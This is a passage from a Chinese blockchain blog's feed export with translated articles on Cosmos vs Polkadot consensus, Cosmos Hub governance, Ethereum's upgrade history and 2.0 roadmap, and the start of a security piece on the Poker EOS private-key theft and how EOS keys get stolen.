网络中的每条平行链都会受到影响。平行链不能被看作是完全不同的东西，毕竟它们都共享同一个全局状态。 共识算法Polkadot 中继链采用的是 GRANDPA 共识算法。这个算法能让中继链迅速确定来自所有平行链的区块，并且容纳大量验证者（1000 名以上）。简单来说，这是因为并非所有验证者都需要对每一个区块进行投票——他们可以只需为自己认为有效的某个区块投票，相当于这个区块之前的所有区块也都得到了认可。通过这种方式，GRANDPA 算法可以找出一组得票数最多的区块，并将这组区块确定了下来。该算法仍处于开发之中，尚不知实际会如何执行。 平行链可以采用不同的共识算法达成局部共识。Polkadot 提供一个软件开发工具包（Substrate），其中包括 GRANDPA、Rhododendron 和 Aurand 三种开箱即用的共识算法。今后可能会有更多算法被加入 Substrate ，皆可应用于 Polkadot 网络。 在 Cosmos 网络中，每条链可以选用的共识算法有很多，只要是符合 ABCI 规范的共识算法即可。 ABCI 规范旨在实现跨链通信的标准化。目前只有 Tendermint 算法符合这个规范，还有另一些团队也在努力开发符合该规范的其他共识算法。从更抽象的层面上来看，Tendermint 算法的原理是让每位验证者都能互相通信，共同决定一个区块能否上链，这样就能实现单一区块层面上的确定性。该算法的速度很快，而且通过了 200 名验证者的压力测试，在 Game of Stakes（权益争夺赛）中的出块时间为 6 秒。Cosmos 团队也提供了一个软件开发工具包，里面包含了开箱即用的 Tendermint 算法。这篇文章很好地介绍了共识算法，以及 Tendermint 算法的功能。 Tendermint 算法最大的缺点是验证者之间的通信成本高很高。也就是说，虽然验证者人数在 200 左右的时候，算法的运行速度很快，一旦人数涨到了 2000 ，速度就会慢得多。另一方面需要权衡的是异步环境中的安全性。也就是说，在出现网络分区之时，不会出现两个不同的交易历史最终合并成一个（而另一个交易历史被抛弃）的情况，而是整个网络都将停止运行。这点非常重要，一旦一笔交易得到了“最终确认”，即使是在最差的网络环境下也不会被撤销。 我的个人观点是，基于共识算法来比较这两个项目没什么长远意义。这两个项目的构架未来都将接受不同的共识算法。如今的绝大多数应用不管使用的是 Tendermint 算法还是 Polkadot 的某个共识算法都可以良好运行。 Substrate vs Cosmos SDKPolkadot 和 Cosmos 都提供软件开发工具包，分别叫作 Substrate 和 Cosmos SDK 。二者的目的都是为了便于开发者搭建自己的区块链，其中包括各种开箱即用的模块，例如治理模块（投票系统）、质押模块和认证模块等。这两个工具包最主要的区别在于，Cosmos SDK 仅支持 Go 语言，而 Substrate 支持任何可编译为 WASM (Web Assembly) 的语言，给予了开发者更多灵活性。 这两个工具包都是构建区块链的全新框架，未来几年还将新增更多功能。关于这两个工具包的深度剖析以及使用这两个工具包开发应用程序的详细体验需要另外写一篇文章了。如果你感兴趣的话，请在推特上给我@juliankoh 留言。 结论虽然这篇文章篇幅很长，写的也很详细，但是依然有所疏漏。Cosmos 和 Polkadot 之间的不同点很难把握，可能还有很多细节我没有捕捉到。要全方位了解这两个项目绝非易事，毕竟项目文件随时都可能改动。这两个项目尚在起步阶段，未来一年将得到极大的发展——我在上文中提到的几个点可能很快就不成立了。总而言之，我认为 Polkadot 相比 Cosmos 主要有以下几个优势： 应用程序开发者不需要自己维护安全性 共享安全性模型下的跨链通信更容易解决数据可用性问题 Substrate（在 WASM、更多共识算法和开箱即用模块方面）表现出很大的野心 相比跨平行链的合约调用更侧重于不限类型的信息传递（这一用例目前尚不明确） 1.0 版本的开发者似乎多一些 反过来，Cosmos 相比 Polkadot 主要有以下几个优势： Cosmos 已经上线了，Polkadot 还没上线 Polkadot 的平行链参与流程限制性更强，而且成本更高 更能满足特定项目（如币安）对自定义的需求 平行链上验证者的恶意行为会波及整个网络。在 Cosmos 网络中，恶意行为只能破坏个别分区和资产 已经有很多项目在使用 Cosmos SDK 了 重点关注如何降低资产转移的难度。目前已经有经过验证的用例。 感谢每一位不厌其烦为我答疑解惑的朋友，尤其是来自 Cosmos 团队的 Zaki Manian 和 Gautier Marin ，以及来自 Polkadot 团队的 Alistair Stewart 。NEAR Protocol (Alex Skidanov) 发布的 Whiteboard Series 系列视频很棒，对我理解这两个项目给予了很大帮助。Linda Xie 整理出来的关于 Polkadot 和 Cosmos 的链接帮助我缩小了文章的范围，让这篇文章更具有可读性。特别感谢Cheryl Yeoh 在我撰写本文的过程中为我提供的灵感和思路，并且对本文进行了审校。 原文链接在这里 ， 在ETHFANS 的闵敏 &amp; 阿剑的翻译基础上有说所修改。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>跨链</category>
      </categories>
      <tags>
        <tag>Cosmos</tag>
        <tag>Polkadot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解 Cosmos Hub 的治理【译】]]></title>
    <url>%2F2019%2F06%2F18%2Fcomsmos-governance%2F</url>
    <content type="text"><![CDATA[本文作者Felix Lutsch 是Chorus One（验证人节点运营服务商）的研究员，本文将介绍Cosmos Hub的治理流程以及如何参与治理。 Cosmos Hub已经正式上线，其核心功能之一就是让Atom代币持有人拥有共同治理区块链的能力。Atom代币持有人可以通过签署特殊类型的交易来提交提案，并表明他们是否批准（或不批准）提交给区块链网络的提案。以下文章将介绍Cosmos Hub的治理流程，以及治理工具，该工具允许任何Atom代币持有人参与链上治理机制。 治理流程在当前的Cosmos Hub治理实施流程中，任何人都可以向系统提交文本提案。不过，如果想要提交的提案进入到投票阶段，则有最低存款金额要求。在投票阶段，Atom代币持有人可以就提案是否被接受进行投票。以下使用的数字是基于文本撰写时（2019年3月25日）在Cosmos Hub上实施的参数。 Cosmos Hub治理流程的一个例证 阶段1：存款阶段对于想要进入到投票阶段的提案，需要在提交该提案之后的两周时间内存入至少512 Atom代币，这也是进入到投票阶段的最低存款金额要求。任何Atom代币持有人都可以支持提案，并且为该提案提供存款，这意味着提案提交方不一定自己存入512 Atom代币，只要有人愿意为其出这笔“钱”即可。同时，存款必须要有垃圾邮件保护，这样当提案被接受的时候或是两周之后未能达到最低存款限额要求，支持该提案的Atom代币持有人就能够收到通知提醒。 阶段2：投票阶段一旦提案满足了最低存款限额要求，那么长达两周（336小时）的投票阶段就将正式启动。在此期间，所有Atom代币持有人可以对该提案进行投票，目前有四个投票选项，分别是“是”、“否”、“行使否决权的否定（No with Veto）”、“弃权”。 Cosmos治理实施有一些重要细节值得关注，包括： 只有质押的（staked/bonded）代币才能参与治理； 投票权基于质押权益(stake)被评估，你拥有的Atom 质押的代币数量决定了对提案决策的影响力大小（代币投票）； 委托人可以继承验证人的投票，除非委托人自己有过投票。如果委托人自己投票的话，将会覆盖验证人的决定。 阶段3：清点投票结果根据Atom代币持有人的投票结果，如果提案被接受，那么至少需要满足以下几个条件： 法定人数(Quorum)：在投票结束的时候，超过40%的权益代币(staked tokens)需要参与投票； 门槛：参与投票代币（剔除“弃权”投票后）需要超过 50% 支持该提案（即选择的投票结果是“是”）； 行使否决权：参与投票的代币（剔除“弃权”投票后）需要低于 33.4% 行使“否决权（No with Veto）”。 如果在投票阶段结束时上述要求中有任何一项没有满足，比如法定人数没有达到，那么该提案就不能被通过。此时，这个被拒绝的提案中的存款不会被退还，而是会被纳入到社区池中。 阶段4：实施提案如果提案被接受，则需要被实现并合并到网络验证人运行的软件中。我们未来还会专门发布一篇文章来详细解释不同类型的提案、以及验证人会如何准确地协调、实施上述提到的那些被接受的提案。 如果你想要看看一个治理投票的典型示例，不妨可以先看看验证人团队B-Harvest的第一个治理提案，该提案是关于调整用于计算网络通胀的块时间比率，以反映网络中的实际情况。（请注意：Chorus One支持该提案，因为它通过实时网络支付权益奖励，符合Cosmos白皮书中的描述。不过我们发现这只是一个临时解决方案，今后也会支持通过引入一个基于网络条件动态调整的其他提案。 如何参与治理在Chorus One，我们的目标是让代币持有人能够对网络治理施加影响。出于这个原因，我们创建了一个工具，允许Atom代币持有人方便的地从他们的Ledger 钱包中投出治理投票，该工具可以在这个链接找到。 结论我们相信通过Cosmos的治理方式，委托人可继承验证者投票，同时委托人也能够覆盖验证者选择并做出自己的决定。这是在其他区块链网络中可以观察到的低治理投票率的一个很好的解决方案。 我们认为这种方法对于不太感兴趣的持有者的代议制民主（“代理投票”）之间取得一个很好平衡，同时仍然允许对想要网络治理的代币持有者直接参与。 Cosmos Hub治理仍处于早期阶段，我们的目标是提供我们对如何改进系统的意见，因为我们相信运行良好的治理机制将增加Cosmos Network成功的可能性。 附录Cosmo 治理的线上资源： Chorus One治理工具 Cosmos SDK治理文档 Cosmos网络治理论坛 治理提案统计: https://bharvest.io/wallet_en https://hubble.figment.network/chains/cosmoshub-1/governance Gaiacli指令查询命令列表（在gaiacli中）： 1gaiacli query gov -h 注：Gaia 是 Cosmos Hub 应用名字，包含 gaiad 和 gaiacli 两个部分。]]></content>
      <categories>
        <category>跨链</category>
        <category>Cosmos</category>
      </categories>
      <tags>
        <tag>Cosmos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【译】以太坊 2.0 路线图]]></title>
    <url>%2F2019%2F06%2F15%2Feth-serenity%2F</url>
    <content type="text"><![CDATA[上一篇文章：以太坊发展简史介绍了当前以太坊经历了哪些升级和硬分叉，本文将继续介绍：什么是Serenity？ETH 2.0将于何时经历哪些阶段？ 概述 以太坊的发展路线一直以来都持续针对核心协议进行更新升级。以太坊于今年二月完成了君士坦丁堡（Constantinople）升级，不久后又将迎来伊斯坦布尔（Istanbul）硬分叉。这意味以太坊社区距Serenity将更近一步。Serenity作为以太坊升级的最后一次迭代，其重要性不言自明。2018年，Vitalik在Devcon上详细阐释了Serenity将分成多个阶段进行，并且每个阶段预计间隔一年。以太坊2.0，也就是大家所熟知的宁静（Serenity）阶段，秉承着五个设计原则：简洁性、强韧性、持久性、安全性、去中心化。之所以要采用循序渐进的方式实现静（Serenity），是为了实现以上所有原则，从而进一步将以太坊打造成区块链解决方案的市场领军者。 第一步：伊斯坦布尔在正式开启Serenity之前，以太坊需要执行伊斯坦布尔硬分叉，这是继今年2月君士坦丁堡升级后的最后一次计划内硬分叉。此次伊斯坦布尔硬分叉预期将于2019年10月进行，该分叉目前包含11个EIPs，其中之一就是EIP 1057 [ProgPoW]。 ProgPoW(Programmatic Proof-of-Work)的相关讨论已经在以太坊社区中持续了一段时间。此EIP建议将协议中的挖矿算法切换为ProgPoW，由于ASIC挖矿效率明显优于GPU，该算法旨在削弱ASIC的挖矿优势。ASIC（专用集成电路）和GPU（图形处理器，即显卡）都是可用于加密货币挖矿的硬件设备。ASIC是高度专业化的硬件，使用ASIC通常可以更高效地进行挖矿作业，从而产生更可观的收益。然而，ASIC的专用性极高，这就意味着用来进行比特币挖矿的ASIC适用于比特币区块链，而进行以太币挖矿的ASIC仅适用于以太坊区块链。虽然效率较高，但ASIC的成本高昂且难以获取，如此一来就可能会导致中心化风险：矿池将被掌控在有能力获取ASIC的矿工手上（这也是长期争论不休的话题）。相比之下，GPU作为通用计算工具也可用于解决许多用例的复杂运算。较之ASIC，GPU可用来对任何加密货币进行挖矿，并且易于获得，使用广泛。然而，也因为GPU不具有类似ASIC的专用算力，其效率和收益远低于ASIC。一旦EIP 1057被通过，使用抗ASIC的ProgPoW算法将使得ASIC和GPU在进行ETH挖矿时具有同等效率，从而确保了网络的去中心化（此说法仍然具有争议）。总的来看，以太坊的核心开发者似乎都是ProgPoW的拥趸，但他们在作出最终决策前已经启用了针对该算法的第三方审计措施。 阶段0：信标链(Beacon Chain) | 2019预计在2019年，Serenity第一阶段将推出信标链(Beacon Chain)。信标链是基于权益证明(Proof of Stake)的区块链，信标链的部署将标志工作量证明(PoW)到权益证明(PoS)共识机制的转变。为了确保链的连续性不被破坏，信标链确立之后将与原始的以太坊PoW链并行。信标链的最初形态囊括了三个主要职责： 管理权益证明(PoS)共识机制：PoS是这样一种共识机制：通过网络质押ETH而非耗费精力挖矿来最终确认新区块的产生。 处理区块的交叉联结（CrossLink）使得区块交叉联结是信标链能够确定和维护分片链状态的主要方式。分片链将于阶段1进行部署，所以此更新是在为阶段1做准备。 引导达成共识和最终确定性信标链通过PoS和Casper FFG共识机制达成最终确定性。PoS规定，2/3的验证者必须在下一个行将产生的区块中质押ETH，这意味着对于潜在的恶意用户来说，施行不正当行为需要承担的经济风险非常之高。 阶段1：分片(Shard Chains) | 2020年分片链是以太坊网络未来可扩容性的核心特征。从整体概念来看，分片是指：将某数据库（去中心化数据库或其他类型数据库）中许多节点的数据处理职责分割开，允许同时进行交易、存储和信息处理。分片理念与目前的以太坊主链模式完全不同，后者则需要每个全节点对每一笔交易进行处理和验证。 Serenity阶段1将在分片链上处理最终确定性和共识。此阶段的分片链更倾向于“测试运行”，而不是可以立即解决扩容问题的方案。信标链将对分片链的执行情况进行监督。验证者质押32个ETH之后将被随机分配到特定的分片链上进行验证工作（此处的随机性可以确保验证者的分配路径是不可预测的，否则将面临人为操纵的风险）。根据以太坊2.0规范，信标链将支持1024个分片链，每条分片链上将有128个节点进行验证工作。 阶段2：eWASM | 2020或2021年在阶段2中，以太坊2.0升级中的重要功能将被聚合起来。随着新虚拟机eWASM (Ethereum-flavored Web Assembly)的引入，分片链将从相当基本的数据标记形态演变为功能完整的交易链，从而担当起以太坊网络扩容的重任。 为了维护区块链生态系统的正常运行，节点必须在虚拟机中执行交易和智能合约。以太坊1.0的虚拟机被称为EVM (以太坊虚拟机)。切换到以太坊2.0和信标链后，以太坊网络的虚拟机将升级为eWASM，这是一个基于Web Assembly的虚拟机，由万维网联盟（W3C）定义为开源标准。由于WASM支持多种编码语言，eWASM使得由任何语言编写的智能合约都能在以太坊上运行，而现有的EVM只允许由Solidity语言编写的智能合约。 “以太坊1.x”我们需要注意的是，在上文提到的Serenity阶段0、1、2中，原有的以太坊 PoW 链并不会消失。它将继续得到维护并且与信标链并行，原始PoW链上的矿工仍然能通过传统的挖矿方式获得ETH奖励。随着生态系统逐渐转移到信标链，PoW链可能面临淘汰（有人提议永远保留PoW链），前提是“难度炸弹”机制使得PoW运算的难度系数几近于不可能。在信标链测试和概念验证期间，原有的以太坊1.0链没有止步不前，而是不断进行完善。这一系列升级和硬分叉就被称作“以太坊1.x”，旨在使当前的以太坊主链持续迭代，以满足信标链部署期间生态系统的需求和应用。 以太坊1.x背后的团队仍处于路线图规划的早期阶段，但他们已经确立了以太坊1.x升级的三个总目标： 通过提高tx/s吞吐量促进主网扩容（优化客户端将大大提高每个区块的gas上限） 收取“状态费用”以限制磁盘空间使用量，从而可以持续运行全节点 升级虚拟机以改善开发人员体验。虚拟机升级包括eWASM和交易模式的改变，新交易模式可以使整体交易费用更加稳定。 开发最终确定性工具，利用信标链对以太坊1.x中的区块进行最终确定，从而连接以太坊1.0和2.0版本。 跟进以太坊1.x的升级更新及其团队动向可以前往：链接1 及 链接2 。 阶段3：后续升级 | 2022阶段2之后，以太坊的发展时间线就没那么明晰了。这也是情理之中的事，因为区块链技术的发展日新月异，开发人员需要继续致力于解决问题、改进协议才能满足不断增长的需求。仍处于讨论阶段的后续升级包括：轻客户端状态协议、主链安全性耦合以及超二次或指数性分片。若以太坊2.0进展顺利，以太坊也将顺势循次而进，届时“以太坊3.0”或将成为下一片新大陆。 原文链接：https://media.consensys.net/the-roadmap-to-serenity-bc25d5807268参考 ECN以太坊中文网 的翻译。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>以太坊简史</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【译】以太坊发展简史]]></title>
    <url>%2F2019%2F06%2F15%2Feth-history1%2F</url>
    <content type="text"><![CDATA[在以太坊在Serenity (ETH 2.0)阶段来临之前经历的升级和硬分叉。通过本文将了解到升级或分叉发生的时间，加入那哪些特性。 概述时至今日当我们鸟瞰区块链技术的发展，它仍旧算得上是一个新事物。尽管有关区块链的基础核心概念（例如密码学、去中心化及点对点网络和交易）的研究已经进行了数十年，但可以说是直到2008年比特币的滥觞，这些零散的概念才被整合起来创造出了一个功能性产品。直到2015年，以太坊逐渐走入人们的视线。至此，以太坊区块链得以成型并且实际可用。尽管计划内升级的日期和细节发生了变化，但以太坊仍坚持不断对协议进行升级，以确保提高其可用性、安全性、功能性和去中心化。 在今年2月的君士坦丁堡（Constantinople）升级完成之后，以太坊目前正处于宁静（Serenity， 也称为以太坊2.0）阶段的风口浪尖，Serenity升级需要通过一系列更新方能达成。然而，居安当思归来源，我们不能忘记自己从哪里来，如此方知来者之可追。以下时间线着眼于以太坊计划内（或计划外）的硬分叉和升级历史，为其下一阶段的升级做好准备。 奥林匹克（Olympic） |2015年5月9日以太坊区块链于2015年7月正式向用户开放使用。以太坊在此之前开放了九个版本的开放测试网络以进行概念证明，其中最后一个版本便是奥林匹克，供开发人员提前探索以太网区块链开放以后的运作方式。Vitalik曾宣布向耗费时间精力对以太坊网络进行压力测试的开发人员提供总额为25,000 ETH的奖励。测试要求很明确：尝试使网络过载，并对网络状态进行极限测试，以便深入了解协议如何处理流量巨大的情况。开发人员需要对四个方面进行测试：交易活动、虚拟机使用、挖矿方式和惩罚机制。 边疆（Frontier） | 2015年7月30日经过几个月的压力测试，以太坊网络已准备好发布官方公共主网。7月20日，以太坊的创世区块产生，社区开始逐渐壮大。在Frontier发布前几个月，Vinay Gupta发表了关于以太坊开发过程的说明。该说明的大部分内容虽然十分令人振奋，但同时也发出了对潜在用户的警示。Gupta表示，Frontier是“处于最初始形态”的以太坊版本，开发者应该谨慎行事。Frontier发布前几天，Stephen Taul对开发者作出了与Gupta类似的提醒：“目前的开发者就如同美国边疆扩张时期的拓荒者一般，他们和自己的同伴在开辟新家园时将获得无穷的机会，但同时也将面临许多危险。” “边疆（Frontier）”协议包含了以下一系列关键特征： 区块奖励：在以太坊区块链上，当矿工成功挖掘出一个新区块并使其存在得到确认之后，他们会得到ETH形式的奖励。在此阶段，奖励被定为每个新区快5个ETH。 Gas：在“边疆”诞生之初，每个区块的gas上限被硬编码为5000。这个数量基本上意味着以太坊网络不支持进一步开发。此阶段Gas上限的制定旨在为矿工提供一段缓冲时间，以帮助他们在以太坊网络上的操作走上正轨，同时使得早期开发者安装他们的客户端。几天之后，gas上限被自动移除，以太坊网络能按预期处理交易和智能合约。 金丝雀合约（Canary Contracts）：金丝雀合约被引入“边疆”的目的是提醒用户存在不正当或易受攻击的某条链。它给出的数值只能是0或1。有问题的合约会被赋值为1，因此客户端就能进行识别，避免在无效链上进行挖矿。金丝雀合约的重要意义在于它使得以太坊核心开发团队能够及时制止网络中出现错误的操作或交易。在以太坊发展初期，金丝雀合约虽然显得十分中心化，但却是不可或缺的保护机制。 可用性：所有开发人员的操作都是经由命令行实现，因为完全不存在图形用户界面。虽然可以在以太坊网络中进行操作，但是其用户界面还十分粗糙，它的使用者也在很大程度上局限于具有以太坊背景知识和经验的专业人士。 家园（Homestead） |2016年3月14日“家园”是以太坊网络的首次硬分叉计划，于2016年3月14日发生在第1,150,000个区块上。总的来说，“家园”版本主要为以太坊带来了三大主要更新。第一，取消了金丝雀合约功能，去除了网络中的中心化成分。第二，在以太坊编程语言Solidity中引入了新代码。第三，上线Mist钱包，使用户能够持有或交易ETH、编写或部署智能合约。 “家园”升级是最早的以太坊改进提案（EIP）实施案例之一。EIPs是面向社区提出的改进建议，一旦获得批准，则会囊括在网络升级中。 “家园”升级包括三个EIPs： **EIP-2：“家园”阶段主要更新 ** EIP 2.1：通过交易创建智能合约的成本被提高至21,000至53,000个[gas](https://learnblockchain.cn/2019/06/11/gas-mean/)。通过一个合约创建另一个合约（首选方式）的成本高于通过交易创建合约。通过提高以交易形式创建智能合约的成本，EIP2.1鼓励用户转向以合约创建合约的方式。 EIP 2.2：“s值大于secp256k1n/2的所有交易签名均视为无效。ECDSA恢复预编译合同保持不变并保持接收高s值；这个功能在某些情境下将发挥作用，例如某合同恢复旧的比特币签名。” EIP 2.3：当合约创建过程中没有足够的gas用以完成操作，该合约将“作废”而非创建一个空白合约。之前的交易可能输出结果包括[成功] [失败]或者[空白]，这一改进则删除了[空白]结果。 EIP 2.4：取消用户挖掘稍高难度区块的激励，即增加可挖掘的区块。此升级将新区快产生的时间稳定在每10-20秒之间，并将网络恢复至每块约15秒的总目标时间。 EIP-7 “在0xf4添加一个新的操作码，DELEGATECALL，它与CALLCODE的理念类似，不同之处在于前者将发送方和发送值从父范围扩散到子范围，即创建的调用与原始调用具有相同的发送方和发送值。” EIP-8：面向未来升级 EIP-8是一项着眼于未来网络升级计划的改进提案。这一改进旨在确保以太坊上的所有客户端软件都能适应未来的网络协议更新。 DAO分叉 | 2016年7月20日在以太坊计划内的升级和硬分叉历史中，计划外的DAO事件值得记录。2016年，一个名为The DAO的去中心化自治组织通过发售通证募集了1.5亿美元的资金。同年6月，the DAO遭到黑客入侵，价值5千万美元的ETH被一未知黑客窃取。以太坊社区的大部分成员决定实行硬分叉，将资金返还到原钱包并修复漏洞。然而，这次硬分叉却引来了争议，以太坊社区的小部分成员选择继续在原链上进行挖矿和交易。未返还被盗资金的原链则演变成了以太坊经典（ETC），久而久之受到削弱的原链成为了容易被侵入的对象(注：前不久遭受了51%攻击)。而大多数社区成员和核心开发人员选择了分叉链（被盗资金返还至原持有者），这就是我们现在所知的以太坊区块链。 大都会（Metropolis）：拜占庭硬分叉（Byzantium） | 2017年10月16日以太坊路线图的下一阶段被称为“大都会”，它将分两个阶段进行：拜占庭（Byzantium）和君士坦丁堡（Constantinople）。拜占庭将于2017年在第4,370,000个区块上激活。其中包括9个EIPs： EIP 100 调整公式以评估将叔块考虑在内的区块难度。新公式为保证了区块产生速度的稳定性，确保无法通过操纵叔块来强制增加区块高度。 EIP 658 对于拜占庭硬分叉升级后的区块，交易收据包括了一个状态字段，用于表示成功（由1表示）或失败（由0表示）。 EIP 649 “难度炸弹”(Difficulty Bomb)是这样一种机制：一旦被激活，将增加挖掘新区块所耗费的成本（即“难度”），直到难度系数变为不可能或者没有新区块等待挖掘。此时，以太坊网络将处于“冻结”状态。“难度炸弹”机制最初于2015年9月被引入以太坊网络。它的目的是为以太坊最终从工作量证明(PoW)转向权益证明(PoS)提供支持。从理论上来说，未来在PoS机制下，矿工仍然可以选择在旧的PoW链上作业，而这种行为将导致社区分裂，从而形成两条独立的链：PoS链由验证人(stakers)维护，PoW条则由矿工维护。为了预防这种情况的发生，“难度炸弹”机制应运而生。通过增加难度，它将最终淘汰PoW挖矿，并催使网络完全过渡到PoS机制，并且在这个过程中避免了产生具有争议的硬分叉。在此建议中，也被称作“冰河时期”的“难度炸弹”时期将延迟一年，并且区块奖励从5 ETH减少到3 ETH。 了解其他拜占庭硬分叉EIPs（140, 196, 197, 198, 211, 214）可以查看这里. 大都会：君士坦丁堡（Constantinople）硬分叉 |2019年2月28日“大都会”升级的第二阶段被称作“君士坦丁堡”，计划于2019年1月中旬在第7,080,000个区块上执行。1月15日，一家名为ChainSecurity的独立安全审计公司发布了一份报告，该报告指出五大主要系统升级其中之一可能会使攻击者有机可乘，以窃取资金。针对该报告，以太坊核心开发者和社区其他成员投票决定推迟升级，直到该安全漏洞得以修复。当月末，以太坊核心开发者宣布升级将于第7,280,000个区块上进行。2月28日，区块高度达到7,280,000，君士坦丁堡硬分叉升级如期执行。目前的以太坊网络处于君士坦丁堡阶段。 其中主要的EIPs包括： EIP 145：按位移动指令 在以太坊虚拟机(EVM)上增加按位移动指令。这个指令允许二进制信息左右移动。这个改进意味着智能合约的变更执行将便宜10倍。 EIP 1052：智能合约验证 允许智能合约只需通过检查另一个智能合约的哈希值来验证彼此。在君士坦丁堡升级之前，智能合约必须提取另一个合约的整个代码才能进行验证，而这样的验证方式需要花费大量时间和精力。 EIP 1014：智能合约函数CREATE2 使得状态信道更易实现。状态信道是基于“链下”(off-chain)交易的以太坊扩容解决方案。 EIP 1283：SSTORE操作码 减少SStore操作码的GAS耗费。这使得交易中多个更新操作的价格更加友好。 EIP 1234：区块奖励&amp;难度炸弹 此改进提案包含两大内容：减少区块奖励和延迟难度炸弹。 减少区块奖励：将区块采矿奖励从每块3 ETH减少到2 ETH。这个改变也被称作“Thirdening”，即以太坊第三次区块奖励减半。 推迟“难度炸弹”：EIP 1234将“难度炸弹”时期推迟12个月，届时将会进行再次投票。 未来可期： 伊斯坦布尔（Istanbul） 及 宁静 (Serenity)放眼未来，“宁静”(Serenity)是以太坊区块链的终极目的地，但在这之前还将经历伊斯坦布尔硬分叉和“以太坊1.x”阶段。伊斯坦布尔硬分叉将主要由围绕着ProgPoW (Programmatic Proof-of-Work)共识算法展开。“宁静”(Serenity)的主要内容包括从工作量证明(PoW)到权益证明(PoS)的完全转变，同时也将完成其他重要的升级：引入信标链(beacon chain)、分片(sharding)概念；以及用eWASM (Ethereum-flavored Web Assembly)替代以太坊虚拟机(EVM)。Serenity的所有升级都将分阶段实现，在此期间，以太坊1.x也将持续得到完善，以确保原始PoW链的延续。要了解即将到来的硬分叉和Serenity，欢迎阅读下一篇文章：以太坊 2.0 路线图 本文译自：https://media.consensys.net/a-short-history-of-ethereum-a8fdc5b4362c ，同时在 ECN以太坊中文网 的翻译基础上，加入了原文链接等内容。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>以太坊简史</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Poker EOS被盗 2万多EOS事件启示 - 谈私钥安全]]></title>
    <url>%2F2019%2F06%2F14%2Fkeep-private-key%2F</url>
    <content type="text"><![CDATA[私钥被盗，满盘皆输——Poker EOS被盗 2万多EOS事件启示。A secret between more than two is no secret. 两人以上知道的秘密就不算秘密。 事件回顾5月24日凌晨，Poker EOS 官方中文电报群中发出通知：由于项目方账户私钥泄露，被黑客攻击。 官方被盗通知 截止5月24日19点，据项目方统计，此次黑客攻击事件项目方损失共计26992.2297EOS，pokereoshome 损失13140EOS，pokereosgame损失8800EOS，poekreobonus损失200EOS，流入交易所900万PKE交易损失约4852.2297EOS。 官方被盗公告 项目方给出此次攻击事件发生的原因是团队私钥管理不当。其实因私钥管理不当而导致损失的事件可以说不是罕见的事了。 交易所被盗金额统计图 据资料汇总，从2014年起至2019年3月共发生交易所被盗事件33起，其中主要因私钥泄露导致损失的有3起：2018年 4月12日，印度加密货币交易所Coinsecure因冷存储恢复失败暴露了用于离线存储的私钥被盗438比特币，警方发现私钥在网上曝光超过12小时；2018年7月26日，KICKICO由于安全漏洞发生导致黑客成功获得了“KICK智能合约账户”的私钥，损失770美元；2015年1月9日，Bitstamp多个操作钱包遭到破坏，导致19,000比特币丢失，据称是由于该公司一名员工下载了一个恶意文件，该文件使攻击者可以访问包含wallet.dat文件的服务器以及公司热钱包的密码。 除交易所被盗外，也有针对个别用户进行攻击，盗取私钥的，2018年7月发生的近千万EOS被盗事件，黑客通过盗取受害人的私钥而盗走了其价值近千万的EOS。 而今年年初轰动一时的交易所Quadriga CX上亿资产被锁事件则是由于其创始人兼首席执行官的突然离世导致其中1.47亿美元的加密数字货币秘钥丢失“被上锁”。 这些丢失的资产一去不复还。因为区块链的“去中心化”的特性，基于区块链技术的加密货币一旦丢失，基本是不可找回的，不可逆的，除非主网分叉。 私钥及其重要性那么什么是私钥呢？有账号就有私钥。私钥是钱包里资金所有权的证明和合约拥有权的证明，其本质是32个byte组成的数组，由256个0或者1随机组成，可以把它理解成银行卡的密码，这个密码除了自己不会有任何人知道，不过银行卡密码是可以自己设置的，而私钥是随机生成的。 阅读这篇文章：理解开发 HD 钱包 更好的了解私钥与账号的关系。 回到此次事件，我们来看EOS私钥。一些普通用户可能不知道在EOS的账号体系中有两种权限的私钥，即Owner 私钥和Active 私钥，并不是只有一把私钥。 Owner 私钥是所有权，具有Active 私钥所有权限，以及具有重置 Active 私钥等最高权限。 Active 私钥即操作权，可以用于平时的转账、投票等满足日常的操作。 Owner私钥和Active私钥的关系类似老板和员工的关系。Owner即老板，拥有最高的权限，可以做任何事情。Active即员工，相对而言权限较小。但是老板只在有重大事件时参与运营，日常的经营业务则是由员工完成的。 于是，平时最常露面的是员工（Active），主要用来做平时的转账、投票等日常的操作。老板（Owner）并不经常出现，只有当员工（Active）发生重大问题，才会需要他出面。 对于Owner私钥和Active私钥的使用与保管，EOS官方推荐用户平时只使用 Active 私钥，把 Owner 私钥离线保存，只在有重大安全问题时用到 Owner 私钥。 这就意味着会有两种操作模式：单私钥模式和双私钥模式。 单私钥模式即Owner 和 Active 使用同一把私钥，这样来说相对简单，只需备份一把私钥。 双私钥模式即 Owner和Active使用不同的私钥，相对单私钥模式而言，这种模式多了一道保险，安全性能更高。 有的用户不知道EOS账号体系有两种权限，主要原因是钱包多采用单私钥模式，自然地这说明了大多钱包的私钥操作模式实际上是不够安全的。 而区块链应用中用来保障用户资产安全的就是公钥和私钥。公钥与私钥是成对出现的，公钥加密，私钥解密。公钥是公开的，它相当于是银行卡号，这样就不难理解私钥才是我们自己能够真正保障我们信息、资产安全的那道“防线”，失私钥者，失“天下”。 私钥是如何被盗的私钥被盗的原由有许多种，在私钥映射、创建、使用时都有可能因操作不当导致私钥被盗。 私钥映射时： 使用了不安全的映射工具。 使用不安全的映射工具，导致映射使用的公私钥是由工具开发者(实际是攻击者)控制的，当 EOS 主网上线后，攻击者随即 updateauth 更新公私钥。或者映射工具在网络传输时没有使用 SSL 加密，攻击者通过中间人的方式替换了映射使用的公私钥。 私钥创建时： 让陌生人帮助注册账号 由于注册账号需要已经存在的账号帮忙抵押内存，这使黑客有机可乘。黑客利用最常见的钓鱼手法——帮忙注册账号盗取用户私钥。我们前面已经说过私钥其实有两把，设置双私钥模式会增强安全性，但让他人帮忙注册账号，就意味着Owner和Active权限都将可能掌握在他人手中，这就丧失了其本该有的安全性。 用户使用空助记词或较弱的助记词组合生成的私钥 